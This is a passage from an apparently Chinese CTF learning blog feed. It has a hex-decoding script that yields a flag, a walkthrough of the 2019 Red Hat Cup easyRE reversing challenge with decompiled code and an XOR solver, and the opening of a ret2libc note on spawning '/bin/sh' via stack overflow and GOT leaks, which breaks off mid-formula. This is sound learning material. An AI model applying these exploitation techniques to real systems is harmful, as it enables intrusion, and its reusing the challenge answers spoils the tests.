class="line">#include&lt;bits/stdc++.h&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">//char s[100];</span><br><span class="line">char s[]=&quot;73756374667b50776e5f405f68756e647265645f79656172737d&quot;;</span><br><span class="line">int b=0;</span><br><span class="line">int main()&#123;</span><br><span class="line">    for(int i=0;i&lt;strlen(s);i+=2)&#123;</span><br><span class="line">        int x=0;</span><br><span class="line">        if(s[i]&lt;=&#x27;9&#x27;)&#123;</span><br><span class="line">            x=(s[i]-&#x27;0&#x27;)&lt;&lt;4;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            x=(s[i]-&#x27;a&#x27;+10)&lt;&lt;4;</span><br><span class="line">        &#125;</span><br><span class="line">        if(s[i+1]&lt;=&#x27;9&#x27;)&#123;</span><br><span class="line">            x+=(s[i+1]-&#x27;0&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            x+=(s[i+1]-&#x27;a&#x27;+10);</span><br><span class="line">        &#125;</span><br><span class="line">        printf(&quot;%c&quot;,x);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本作者也是没想到啊，学逆向要把加密看那么透的，当时学RSA偷懒了啊，所以导致昨天捡起又花了很多时间，不过也好，加深了我对RSA算法的印象。</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> crypto </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>红帽杯2019 easyRe</title>
      <link href="/2021/05/06/%E7%BA%A2%E5%B8%BD%E6%9D%AF2019%20Easyre%20wp/"/>
      <url>/2021/05/06/%E7%BA%A2%E5%B8%BD%E6%9D%AF2019%20Easyre%20wp/</url>
      
        <content type="html"><![CDATA[<p><code>pwn</code>题做完<code>re</code>题当然也不能少，<code>buu</code>上除了那些水题，开始做一些带点技术含量的题目了。</p><span id="more"></span><p>红帽杯2019的<code>easyRE</code>上来就是<code>800KB</code>的<code>elf</code>文件，看起来就很有技术含量的样子。其实看到大文件不用怕，函数多也不用怕，因为需要分析的函数一定只有几个，如果你点进去调用了大部分你没见过的函数，还有十分复杂的<code>goto</code>关系，那么这个函数你可以直接当他不存在，这是我自己得到的一个结论，不一定对，但是可以应付大部分的题目。废话不多说进入正题：<a href="https://buuoj.cn/challenges#[2019%E7%BA%A2%E5%B8%BD%E6%9D%AF]easyRE">buuctf 2019红帽杯easyRE</a></p><p>所有二进制安全相关的题目字符串一定是切入点，因为它可读。做<code>pwn</code>题你就找<code>flag</code>，<code>bin/sh</code>，当然这是签到-难度的题目才会有的字符串。做逆向题的话，看到很长的64位或者65位大小写字母和数字和一些其它字符组成的表，那么直接考虑<code>base64</code>，然后就是一些带<code>flag</code>的字符串或者是什么<code>right</code>，<code>correct</code>，<code>congratulate</code>之类判断正误的话，那么多半也是以调用这个字符串的函数为中心去分析。好的，打开先看一下，看到有很多很多的函数，先不慌(实则慌的一批)，冷静地先摁一个<code>shift+F12</code>查看字符串。</p><p><img src="https://i.loli.net/2021/05/06/5bQk79uOfiWDAea.png" alt="buuoj 红帽杯2019 easyRE_1.png"></p><p>一眼就可以看道有一个经典的<code>base64</code>表，还有一句话<code>you found me</code>(你找到我了)，像极了<code>flag</code>跟我们的对话，那么话不多说，点进去找到这个函数看看到底在哪里发出了这样的感叹。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_4009C6</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-114h]</span></span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+10h] [rbp-110h]</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+18h] [rbp-108h]</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+20h] [rbp-100h]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+28h] [rbp-F8h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+30h] [rbp-F0h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+38h] [rbp-E8h]</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+40h] [rbp-E0h]</span></span><br><span class="line">  __int64 v9; <span class="comment">// [rsp+48h] [rbp-D8h]</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+50h] [rbp-D0h]</span></span><br><span class="line">  __int64 v11; <span class="comment">// [rsp+58h] [rbp-C8h]</span></span><br><span class="line">  <span class="keyword">char</span> v12[<span class="number">13</span>]; <span class="comment">// [rsp+60h] [rbp-C0h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v13[<span class="number">4</span>]; <span class="comment">// [rsp+6Dh] [rbp-B3h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v14[<span class="number">19</span>]; <span class="comment">// [rsp+71h] [rbp-AFh] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v15[<span class="number">32</span>]; <span class="comment">// [rsp+90h] [rbp-90h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v16; <span class="comment">// [rsp+B0h] [rbp-70h]</span></span><br><span class="line">  <span class="keyword">char</span> v17; <span class="comment">// [rsp+B4h] [rbp-6Ch]</span></span><br><span class="line">  <span class="keyword">char</span> v18[<span class="number">72</span>]; <span class="comment">// [rsp+C0h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v19; <span class="comment">// [rsp+108h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v19 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  qmemcpy(v12, <span class="string">&quot;Iodl&gt;Qnb(ocy&quot;</span>, <span class="number">12</span>);</span><br><span class="line">  v12[<span class="number">12</span>] = <span class="number">127</span>;</span><br><span class="line">  qmemcpy(v13, <span class="string">&quot;y.i&quot;</span>, <span class="number">3</span>);</span><br><span class="line">  v13[<span class="number">3</span>] = <span class="number">127</span>;</span><br><span class="line">  qmemcpy(v14, <span class="string">&quot;d`3w&#125;wek9&#123;iy=~yL@EC&quot;</span>, <span class="keyword">sizeof</span>(v14));</span><br><span class="line">  <span class="built_in">memset</span>(v15, <span class="number">0</span>, <span class="keyword">sizeof</span>(v15));</span><br><span class="line">  v16 = <span class="number">0</span>;</span><br><span class="line">  v17 = <span class="number">0</span>;</span><br><span class="line">  sub_4406E0(<span class="number">0LL</span>, v15, <span class="number">37LL</span>);</span><br><span class="line">  v17 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( sub_424BA0(v15) == <span class="number">36</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; (<span class="keyword">unsigned</span> __int64)sub_424BA0(v15); ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)(v15[i] ^ i) != v12[i] )</span><br><span class="line">      &#123;</span><br><span class="line">        result = <span class="number">4294967294LL</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    sub_410CC0(<span class="string">&quot;continue!&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(v18, <span class="number">0</span>, <span class="number">0x40</span>uLL);</span><br><span class="line">    v18[<span class="number">64</span>] = <span class="number">0</span>;</span><br><span class="line">    sub_4406E0(<span class="number">0LL</span>, v18, <span class="number">64LL</span>);</span><br><span class="line">    v18[<span class="number">39</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( sub_424BA0(v18) == <span class="number">39</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = sub_400E44(v18);</span><br><span class="line">      v3 = sub_400E44(v2);</span><br><span class="line">      v4 = sub_400E44(v3);</span><br><span class="line">      v5 = sub_400E44(v4);</span><br><span class="line">      v6 = sub_400E44(v5);</span><br><span class="line">      v7 = sub_400E44(v6);</span><br><span class="line">      v8 = sub_400E44(v7);</span><br><span class="line">      v9 = sub_400E44(v8);</span><br><span class="line">      v10 = sub_400E44(v9);</span><br><span class="line">      v11 = sub_400E44(v10);</span><br><span class="line">      <span class="keyword">if</span> ( !(<span class="keyword">unsigned</span> <span class="keyword">int</span>)sub_400360(v11, off_6CC090) )</span><br><span class="line">      &#123;</span><br><span class="line">        sub_410CC0(<span class="string">&quot;You found me!!!&quot;</span>);</span><br><span class="line">        sub_410CC0(<span class="string">&quot;bye bye~&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      result = <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      result = <span class="number">4294967293LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_13:</span><br><span class="line">  <span class="keyword">if</span> ( __readfsqword(<span class="number">0x28</span>u) != v19 )</span><br><span class="line">    sub_444020();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>找到这个函数之后就是以这个为主去分析了，由于这个函数特别不友好，我们得去看看这个函数调用的其它那么多sub函数有没有我们认识的熟悉的函数。其实第一点很容易可以看出<code>sub_410CC00</code>非常像输出一句话，也就是<code>puts</code>函数，当然把它理解为<code>printf</code>也没有关系，不影响。根据代码段</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">v18[<span class="number">39</span>] = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> ( sub_424BA0(v18) == <span class="number">39</span> )</span><br></pre></td></tr></table></figure><p>函数参数为字符指针，返回一个数值，是不是像极了strlen函数？</p><p><code>sub_4406E0(0LL, v15, 37LL);</code>这个函数，第一个参数0，第二个参数，字符指针，第三个参数一个整型变量，其实也不难判断出是<code>read</code>函数，这个靠自己积累多了，看道这种形式就知道是这个函数。这么讲有些人可能懵懵的，那我这么说，<code>sub_4105A6(&quot;%d%d&quot;,&amp;v1,&amp;v2)</code>是什么函数？你会很快看出这就是一个<code>scanf</code>，除了<code>scanf</code>还有哪个函数写得出这种形式啊？喏，道理一样的。那么我们把那些函数重命名回去看看整体观感好了不少。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_4009C6</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-114h]</span></span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+10h] [rbp-110h]</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+18h] [rbp-108h]</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+20h] [rbp-100h]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+28h] [rbp-F8h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+30h] [rbp-F0h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+38h] [rbp-E8h]</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+40h] [rbp-E0h]</span></span><br><span class="line">  __int64 v9; <span class="comment">// [rsp+48h] [rbp-D8h]</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+50h] [rbp-D0h]</span></span><br><span class="line">  __int64 v11; <span class="comment">// [rsp+58h] [rbp-C8h]</span></span><br><span class="line">  <span class="keyword">char</span> v12[<span class="number">13</span>]; <span class="comment">// [rsp+60h] [rbp-C0h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v13[<span class="number">4</span>]; <span class="comment">// [rsp+6Dh] [rbp-B3h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v14[<span class="number">19</span>]; <span class="comment">// [rsp+71h] [rbp-AFh] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v15[<span class="number">32</span>]; <span class="comment">// [rsp+90h] [rbp-90h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v16; <span class="comment">// [rsp+B0h] [rbp-70h]</span></span><br><span class="line">  <span class="keyword">char</span> v17; <span class="comment">// [rsp+B4h] [rbp-6Ch]</span></span><br><span class="line">  <span class="keyword">char</span> v18[<span class="number">72</span>]; <span class="comment">// [rsp+C0h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v19; <span class="comment">// [rsp+108h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v19 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  qmemcpy(v12, <span class="string">&quot;Iodl&gt;Qnb(ocy&quot;</span>, <span class="number">12</span>);</span><br><span class="line">  v12[<span class="number">12</span>] = <span class="number">127</span>;</span><br><span class="line">  qmemcpy(v13, <span class="string">&quot;y.i&quot;</span>, <span class="number">3</span>);</span><br><span class="line">  v13[<span class="number">3</span>] = <span class="number">127</span>;</span><br><span class="line">  qmemcpy(v14, <span class="string">&quot;d`3w&#125;wek9&#123;iy=~yL@EC&quot;</span>, <span class="keyword">sizeof</span>(v14));</span><br><span class="line">  <span class="built_in">memset</span>(v15, <span class="number">0</span>, <span class="keyword">sizeof</span>(v15));</span><br><span class="line">  v16 = <span class="number">0</span>;</span><br><span class="line">  v17 = <span class="number">0</span>;</span><br><span class="line">  read(<span class="number">0LL</span>, v15, <span class="number">37LL</span>);</span><br><span class="line">  v17 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(v15) == <span class="number">36</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; (<span class="keyword">unsigned</span> __int64)<span class="built_in">strlen</span>(v15); ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)(v15[i] ^ i) != v12[i] )</span><br><span class="line">      &#123;</span><br><span class="line">        result = <span class="number">4294967294LL</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;continue!&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(v18, <span class="number">0</span>, <span class="number">0x40</span>uLL);</span><br><span class="line">    v18[<span class="number">64</span>] = <span class="number">0</span>;</span><br><span class="line">    read(<span class="number">0LL</span>, v18, <span class="number">64LL</span>);</span><br><span class="line">    v18[<span class="number">39</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strlen</span>(v18) == <span class="number">39</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = sub_400E44(v18);</span><br><span class="line">      v3 = sub_400E44(v2);</span><br><span class="line">      v4 = sub_400E44(v3);</span><br><span class="line">      v5 = sub_400E44(v4);</span><br><span class="line">      v6 = sub_400E44(v5);</span><br><span class="line">      v7 = sub_400E44(v6);</span><br><span class="line">      v8 = sub_400E44(v7);</span><br><span class="line">      v9 = sub_400E44(v8);</span><br><span class="line">      v10 = sub_400E44(v9);</span><br><span class="line">      v11 = sub_400E44(v10);</span><br><span class="line">      <span class="keyword">if</span> ( !(<span class="keyword">unsigned</span> <span class="keyword">int</span>)sub_400360(v11, off_6CC090) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;You found me!!!&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;bye bye~&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      result = <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      result = <span class="number">4294967293LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_13:</span><br><span class="line">  <span class="keyword">if</span> ( __readfsqword(<span class="number">0x28</span>u) != v19 )</span><br><span class="line">    sub_444020();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>你会突然自言自语，”这两个是一个函数？“，不要慌，小场面，小场面。那么这么之后就看看主要的内容，首先一个<code>for</code>循环映入眼帘，发现我们输入的<code>v15[i]^i</code>如果不等于<code>v12[i]</code>那么就会直接跳到最后一行结束程序，那么我们肯定要看看不让它跳转的输入语句是个什么。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">c</span><br><span class="line"></span><br><span class="line">char v12[13]; // [rsp+60h] [rbp-C0h] BYREF</span><br><span class="line">char v13[4]; // [rsp+6Dh] [rbp-B3h] BYREF</span><br><span class="line">char v14[19]; // [rsp+71h] [rbp-AFh] BYREF</span><br><span class="line">char v15[32]; // [rsp+90h] [rbp-90h] BYREF</span><br></pre></td></tr></table></figure><p>这个事实上是按照栈的顺序排列的，也就是说<code>v12</code>在靠近栈顶的地方，<code>v15</code>在靠近栈底的地方。</p><p>那么<code>v15</code>看着没有<code>37</code>的大小，把它溢出一下用用别人的不就好了嘛，别人反正在我用的时候它也不用，然后那些<code>v12,v13,v14</code>都可以看成首尾相连的，因为它们的栈地址本来就挨着的。然后那些都是有赋初值的，那么我们写一个脚本跑一下看看这串字符是什么。</p><p><img src="https://i.loli.net/2021/05/06/5aroWkuvRVFHA9C.png" alt="buuoj 红帽杯2019 easyRE_2.png"></p><p>它告诉你了一串信息：前四个字符是<code>flag</code>你花了这么久时间破解出来的一串字符，它肯定有用，先留着，后面分析肯定要用。</p><p>然后第二个引入眼帘的就是10个一模一样的函数了，点进去发现它引用了base64的那张表，而且很明显看见3,4之类在base64加密解密很常见的数字，那么不用细看了，肯定base64解密。然后看看发现读入了40个字符，然后后面还有一个函数<code>!(unsigned int)sub_400360(v11, off_6CC090)</code>稍微再熟悉点就会发现肯定是<code>strcmp</code>函数，常用格式嘛<code>if(!strcmp)</code>，那么就是它解密了10次变成长度39的字符串，这里真的不用考虑这个函数是加密的情况，总不可能加密了，这个长度才40，算一算也很清楚。那么如果是解密的话，原字符串长度大概在710长度左右，公式：<code>40*((4/3)**10)</code>算得的。这么长的字符串，刚刚那个第一个就是，大概长度就是710，很符合我们的需求，写exp对它10次base64解密得到一个<a href="https://bbs.pediy.com/thread-254172.htm">网址</a>，然后你就发现自己被骗了，那里没有<code>flag</code>，然后就会发现这里没什么地方可以分析了。</p><p>然后你可以看到刚刚那一串很长的字符串上面还有一串字符串。</p><p><img src="https://i.loli.net/2021/05/06/TdMyJQIqXgPu1WF.png" alt="buuoj 红帽杯2019 easyRE_3.png"></p><p>一路跟踪它发现来到了另一个函数<code>sub_400D35</code>可以很明显看到<code>102</code>,<code>103</code>它们分别是<code>f</code>,<code>g</code>的ascii码值，并且刚好下标在0和3，那么回想前面给的信息，直接断定这个字符串是<code>flag</code>。</p><p><img src="https://i.loli.net/2021/05/06/ieT7YQB9vgjkn2z.png" alt="buuoj 红帽杯2019 easyRE_4.png"></p><p>然后后面对这个字符串动手动脚的，那么找到了长度为25的一个字符串，根据它的加密规则：每四位轮换<code>v2[4]</code>对它异或运算。甭管<code>v2</code>是啥，它和这个字符开头异或肯定是<code>flag</code>这个是铁的道理，因为前面破解出了一个提示。</p><p>那么咱们写脚本解一下这串字符。直接得到<code>flag</code></p><p><img src="https://i.loli.net/2021/05/06/rVxmMbHEOuZATvW.png" alt="buuoj 红帽杯2019 easyRE_5.png"></p><p>exp:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> s[]=&#123;<span class="number">0x40</span>,<span class="number">0x35</span>,<span class="number">0x20</span>,<span class="number">0x56</span>,<span class="number">0x5D</span>,<span class="number">0x18</span>,<span class="number">0x22</span>,<span class="number">0x45</span>,<span class="number">0x17</span>,<span class="number">0x2F</span>,<span class="number">0x24</span>,<span class="number">0x6E</span>,<span class="number">0x62</span>,<span class="number">0x3C</span>,<span class="number">0x27</span>,<span class="number">0x54</span>,<span class="number">0x48</span>,<span class="number">0x6C</span>,<span class="number">0x24</span>,<span class="number">0x6E</span>,<span class="number">0x72</span>,<span class="number">0x3C</span>,<span class="number">0x32</span>,<span class="number">0x45</span>,<span class="number">0x5b</span>,<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">string</span> key=<span class="string">&quot;flag&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)</span><br><span class="line">        key[i]^=s[i];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="built_in">strlen</span>(s);i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,s[i]^key[i%<span class="number">4</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> re </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ret2libc学习报告</title>
      <link href="/2021/05/01/ret2libc%E5%AD%A6%E4%B9%A0%E6%8A%A5%E5%91%8A/"/>
      <url>/2021/05/01/ret2libc%E5%AD%A6%E4%B9%A0%E6%8A%A5%E5%91%8A/</url>
      
        <content type="html"><![CDATA[<p>在做<code>pwn</code>题的时候，我们会想尽一切办法执行函数<code>system(&quot;/bin/sh&quot;)</code>，那么执行这个需要两点：</p><p>1.找到<code>system()</code>函数。</p><p>2.找到<code>&quot;/bin/sh&quot;</code>字符串。</p><span id="more"></span><h2 id="level0-have-everything"><a href="#level0-have-everything" class="headerlink" title="level0:have everything"></a>level0:have everything</h2><p>这个情况在简单比赛的签到题估计都出不了了，在溢出点写上<code>system()</code>的地址，若是32位则隔四字节往后填充<code>&quot;/bin/sh&quot;</code>字符串就行了。如果是64位的那么找到<code>pop %rdi ret</code>的<code>gadgets</code>在返回地址填上，并且后面堆上<code>&quot;/bin/sh&quot;</code>的地址和<code>system()</code>的地址即可成功</p><h2 id="level1-without-“bin-sh”"><a href="#level1-without-“bin-sh”" class="headerlink" title="level1:without “bin/sh”"></a>level1:without “bin/sh”</h2><p>在一个地方写上<code>&quot;bin/sh&quot;</code>然后溢出的时候传参就行了。如果没开启<code>ASLR</code>那么可以直接往栈上写，如果开了那你只能往<code>.bss</code>段去写，其实写好后跟<code>level0</code>差不多,也不多赘述。</p><h2 id="level9999-have-nothing"><a href="#level9999-have-nothing" class="headerlink" title="level9999:have nothing"></a>level9999:have nothing</h2><p>哇，这个难度我觉得真的是上升了不少档次，所以给个<code>9999</code>级我觉得不过分。</p><p>啥都没有的情况就要往<code>libc</code>里面去找<code>system()</code>函数了，<code>libc</code>的所有函数之间的偏移都是固定的，确定了一个函数相当于确定了<code>libc</code>中所有的函数的地址。然后就是困扰了我一整天的东西了：<code>plt</code>表和<code>got</code>表，这两个表是什么愣是看了很久，因为感觉按照自己的逻辑完全没必要弄这么两张表的。</p><p>先看看专业解释的<code>plt</code>和<code>got</code>：</p><p><code>plt(procedure linkage table)</code>程序联动表:</p><p>当程序执行的时候在这个表里执行搜寻系统函数地址的代码。首次执行系统函数时，搜寻获取真实地址,其后再执行该函数时直接从GOT中获取真实地址。</p><p><code>got(global offset table):</code>全局偏移表:</p><p>在还没有获取到地址的时候，默认返回<code>plt</code>表调用<code>dl_runtime_resolve</code>函数寻找libc函数的地址。</p><p>其实我到现在都还不敢肯定我讲的对不对，但是我也要敢于说出来，让别人看到，如果你看到我的观点认为有很大问题的，欢迎你跟我联系，将感激不尽。</p><p>以下为我目前认为的观点：</p><p>程序在运行的时候加载<code>libc</code>，只有一个能确定：那就是偏移，但是基址是不确定的，因此我之前的疑惑：如果知道偏移那何不直接把地址写在<code>got</code>表里面就解开了。第一次运行的时候要去寻找基址，然后才能加上偏移写在<code>got</code>表中，就可以很方便地直接调用了。那么可能又会有疑问：为什么我每一次运行的地址都确定的？那是因为我们nc的远程服务器它只运行了这一个程序，也就是只有这一个程序调用了<code>libc</code>，所以每一次运行的时候当然确定的，当然前提是这个文件没有开启<code>ASLR</code>。</p><p>以上只是自己在搜集了这么多师傅的资料后能得到的自己认为正确的观点，真的很大概率错的。</p><p>如果got表没有装载<code>system</code>函数那么我们就要自己寻找<code>system</code>函数的地址了。我们先列出一些公式，我设<code>libc</code>里面有一函数<code>aaa()</code>，那么可以得到</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aaa=libc_base+aaa_offset</span><br><span 